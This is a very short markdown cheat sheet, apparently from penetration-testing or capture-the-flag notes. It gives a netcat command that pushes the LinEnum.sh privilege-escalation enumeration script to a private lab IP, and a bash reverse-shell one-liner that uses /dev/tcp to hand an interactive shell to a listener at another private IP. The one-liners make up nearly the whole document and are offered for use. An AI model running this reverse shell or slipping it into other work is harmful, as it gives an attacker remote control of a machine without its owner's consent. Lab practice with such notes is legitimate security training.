# Send files

### Send file to a machine
```bash
nc -w -3 10.10.13.125 1337 < LinEnum.sh
```

### Connect from server to local machine
```bash
/bin/bash -i >& /dev/tcp/10.11.21.99/1234 0>&1
```

